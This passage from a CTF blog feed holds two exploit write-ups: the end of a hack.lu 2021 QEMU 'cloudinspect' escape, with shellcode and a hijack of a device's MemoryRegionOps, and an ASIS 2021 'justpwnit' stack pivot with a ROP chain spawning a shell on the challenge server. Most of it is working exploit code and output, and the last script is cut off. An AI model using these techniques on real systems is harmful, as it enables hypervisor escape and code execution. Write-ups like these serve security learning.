<span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c1">; we pushed the flag str so we destroy it</span>
<span class="nf">ret</span> <span class="c1">; return to continue the execution</span>
</code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
</span><span class="cp"></span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="n">CODE</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Writing the shellcode @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
<span class="cm">/*
</span><span class="cm">[*] Writing the shellcode @ 7fc604001000
</span><span class="cm">*/</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="craft-fake-memoryregionops-structure">
        Craft fake MemoryRegionOps structure
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#craft-fake-memoryregionops-structure" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Craft fake MemoryRegionOps structure" href="#craft-fake-memoryregionops-structure">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To cratf a fake <code>MemoryRegionOps</code>, I just read the original <code>MemoryRegionOps</code> structure, I edited the <code>read</code> handler, and I wrote it back, in a writable memory area, at <code>leak_rwx+0x2000</code>. Given that <code>sizeof(MemoryRegionOps)</code> is not superior to <code>DMA_SIZE</code>, I can read and write in one time. Then we got:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
</span><span class="c1"></span>
<span class="k">struct</span> <span class="n">MemoryRegionOps</span> <span class="n">fake_ops</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] reading struct mmio.MemoryRegionOps @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>

<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="n">addr_obj</span> <span class="o">-</span> <span class="n">ops_struct</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>

<span class="c1">// Write it in the fake struct
</span><span class="c1"></span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_ops</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">fake_ops</span><span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="p">(</span><span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span> 
<span class="c1">// Edit the handler we want to hook to make it point to the shellcode at leak_rwx + 0x1000
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] fake_ops.read = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_ops</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>

<span class="c1">// patch it and write it @ leak_rwx + 0x2000
</span><span class="c1"></span><span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x2000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="hook-mmioops--profit">
        Hook mmio.ops + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#hook-mmioops--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Hook mmio.ops &#43; PROFIT" href="#hook-mmioops--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>We just have to replace the original <code>CoudInspect.mmio.ops</code> pointer to a pointer to the <code>fake_ops</code> structure.
Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original <code>CoudInspect.mmio.ops</code> pointer to read the flag at <code>leak_rwx+0x5000</code>! Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
<span class="c1">// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
</span><span class="c1"></span>
<span class="n">ioread</span><span class="p">(</span><span class="mh">0x37</span><span class="p">);</span> <span class="c1">// trigger the read handler we control, then the shellcode is 
</span><span class="c1">// executed and the flag is written @ leak_rwx + 0x5000[enter link description here](cloudinspect)
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="c1">// So we just have to read the flag @ leak_rwx + 0x5000
</span><span class="c1"></span>
<span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] CloudInspectState.mmio.ops = original ops</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Reading the flag @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x5000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x5000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&#34;Failed to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">memcpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>


<span class="c1">// adresses are different because here is another execution on the remote challenge
</span><span class="c1"></span><span class="cm">/*
</span><span class="cm">b&#39;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ 7fe3dc001000\r\r\n&#39;
</span><span class="cm">b&#39;[*] CloudInspectState.mmio.ops = original ops\r\r\n&#39;
</span><span class="cm">b&#39;[*] Reading the flag @ 7fe3dc005000\r\r\n&#39;
</span><span class="cm">b&#39;flag: flag{cloudinspect_inspects_your_cloud_0107}\r\r\n&#39;
</span><span class="cm">
</span><span class="cm">flag: flag{cloudinspect_inspects_your_cloud_0107}
</span><span class="cm">*/</span>
</code></pre></div><p>Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
You can the final exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="resources">
        Resources
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li><a
  class="gblog-markdown__link"
  href="https://tldp.org/LDP/tlk/dd/pci.html"
  
  >Interesting article about PCI devices</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/filesystems/sysfs-pci.txt"
  
  >Linux kernel PCI documentation</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt"
  
  >Linux kernel pagemap documentation</a
></li>
</ul>
]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/hack.lu" term="hack.lu" label="hack.lu" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/arbitrary-read" term="arbitrary-read" label="arbitrary read" />
                             
                                <category scheme="https://nasm.re/tags/arbitrary-write" term="arbitrary-write" label="arbitrary write" />
                             
                                <category scheme="https://nasm.re/tags/hypervisor" term="hypervisor" label="hypervisor" />
                             
                                <category scheme="https://nasm.re/tags/qemu" term="qemu" label="qemu" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[ASIS CTF QUALS 2021 - pwn] abbr & justpwnit]]></title>
            <link href="https://nasm.re/posts/pwnasis/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/pwnasis/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2021-10-24T00:00:00+00:00</published>
            <updated>2021-10-24T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.
You can find the related files <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/asisctf"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="justpwnit">
        justpwnit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#justpwnit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor justpwnit" href="#justpwnit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
The binary is statically linked and here is the checksec&rsquo;s output:</p>
<pre tabindex="0"><code>[*] '/home/nasm/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
Here it is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
</span><span class="cm"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
</span><span class="cm"> */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define STR_SIZE 0x80
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">set_element</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">parray</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%*c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">STR_SIZE</span><span class="p">)))</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">STR_SIZE</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">justpwnit</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">array</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_element</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mi">180</span><span class="p">);</span>
  <span class="n">justpwnit</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
<p>Let&rsquo;s see this in gdb !</p>
<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
04:0020│         0x7ffef0386500 ◂— 0x0
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│ rax     0x7ffef0386520 ◂— 0xb4
09:0048│         0x7ffef0386528 ◂— 0x0
... ↓            4 skipped
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
</code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
<p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    
08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        
09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         
... ↓            4 skipped                                                                                                                                                                     
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         
</code></pre><p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.
The binary is statically linked, and there is no system function in the binary, so we can&rsquo;t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
<p>And so what we need is:</p>
<ul>
<li>pop rdi gadget</li>
<li>pop rsi gadget</li>
<li>pop rdx gadget</li>
<li>pop rax gadget</li>
<li>syscall gadget</li>
<li>mov qword ptr [reg], reg [to write &ldquo;/bin/sh\0&rdquo;] in a writable area</li>
</ul>
<p>We can easily find these gadgets with the help <a
  class="gblog-markdown__link"
  href="https://github.com/JonathanSalwan/ROPgadget"
  
  >ROPgadget</a
>.
We got:</p>
<pre tabindex="0"><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
0x0000000000401001 : pop rax ; ret
0x00000000004019a3 : pop rsi ; ret
0x00000000004013e9 : syscall
0x0000000000403d23 : pop rdx ; ret
0x0000000000401b0d : pop rdi ; ret
</code></pre><p>Now we just have to craft the ropchain !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>

<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>
<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</code></pre></div><p>And we can enjoy the shell !</p>
<pre tabindex="0"><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 11010: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="full-exploit">
        Full exploit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#full-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Full exploit" href="#full-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfinit</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;justpwnit&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

